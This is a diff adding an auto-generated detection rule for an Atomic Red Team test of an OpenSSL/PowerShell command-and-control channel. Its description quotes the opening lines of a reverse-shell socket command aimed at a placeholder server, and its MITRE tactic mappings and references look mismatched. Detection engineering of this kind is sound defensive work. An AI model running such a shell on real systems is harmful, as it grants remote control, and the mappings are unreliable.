@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'OpenSSL C2' (GUID: 21caf58e-87ad-440c-a6b8-3ac259964003) of technique T1573 (Encrypted Channel). Test Description: Thanks to @OrOneEqualsOne for this quick C2 method.\nThis is to test to see if a C2 session can be established using an SSL socket.\nMore information about this technique, including how to set up the listener, can be found here:\nhttps://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926\n\nUpon successful execution, powershell will make a network connection to 127.0.0.1 over 443.. Command/Steps: $server_ip = #{server_ip}\n$server_port = #{server_port}\n$socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}')\n$stream = $socket..."
+from = "now-9m"
+rule_id = "46e15ec7-8615-4b2d-953b-84aa10fb008c"
+language = "kql"
+name = "Atomic Test: T1573 - OpenSSL C2"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1573/T1573.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1573", "21caf58e-87ad-440c-a6b8-3ac259964003", "windows",]
+type = "query"
+query = "(process.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\") OR process.parent.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\")) AND (powershell.script_block_text : \\\"*$server_ip*\\\" AND powershell.script_block_text : \\\"*127.0.0.1*\\\" AND powershell.script_block_text : \\\"*$server_port*\\\" OR (process.command_line : \\\"*$server_ip*\\\" AND process.command_line : \\\"*127.0.0.1*\\\" AND process.command_line : \\\"*$server_port*\\\"))"
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1573"
+name = "OpenSSL C2"
+reference = "https://attack.mitre.org/techniques/T1573"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1573"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1573"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1573"
+
+
